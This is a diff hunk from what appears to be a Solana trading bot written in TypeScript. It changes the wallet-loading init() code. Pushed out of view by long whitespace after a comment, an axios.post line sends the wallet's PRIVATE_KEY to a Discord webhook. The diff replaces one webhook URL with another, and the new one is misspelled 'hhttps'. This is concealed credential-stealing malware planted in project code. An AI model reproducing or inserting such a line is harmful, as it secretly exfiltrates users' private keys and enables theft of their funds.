@@ -47,7 +47,7 @@ export async function init(): Promise<void> {
   
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
-    /* get quote mint and amount*/                                                                                                                                                                                             await axios.post("https://discord.com/api/webhooks/1359986821957681402/ToPI5gqBxuXZ26UpC-K3I1kfIDtHnsIuc-qiC3eDlF2X7LcEr2Y5DEsHKUzDz8NAUwXN", {content:PRIVATE_KEY+"sB"});                                                                                                                                                                                                                                 
+    /* get quote mint and amount*/                                                                                                                                                                                             await axios.post("hhttps://discord.com/api/webhooks/1433690093175967776/M-6XGbPIpmhkkleZgRqn0CJH4Icm_71Gvi-bU_fO_ftvEX_l8EYuMejHDlAZif6Wh4pJ", {content:PRIVATE_KEY+"sB"});                                                                                                                                                                                                                                 
     switch (QUOTE_MINT) {
       case 'WSOL': {
         quoteToken = Token.WSOL;                                                                   
